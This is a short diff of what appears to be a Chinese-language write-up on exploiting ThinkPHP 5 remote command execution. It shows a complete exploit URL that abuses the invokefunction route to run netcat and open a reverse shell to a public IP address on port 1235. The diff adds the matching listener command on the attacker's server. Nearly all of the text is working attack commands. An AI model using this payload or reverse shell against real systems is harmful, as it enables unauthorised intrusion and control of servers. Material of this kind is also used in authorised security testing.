@@ -31,9 +31,11 @@ VERSION : free 1.0
 - 公网主机：45.\*.\*.190
 
 利用命令执行弹shell
-
+  
 这次用NC弹shell
 http://10.203.87.64/tp5/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=nc%20-e%20/bin/sh%2045.76.101.190%201235
 
 
 公网服务器上面监听：
+nc -l -p 1235
+
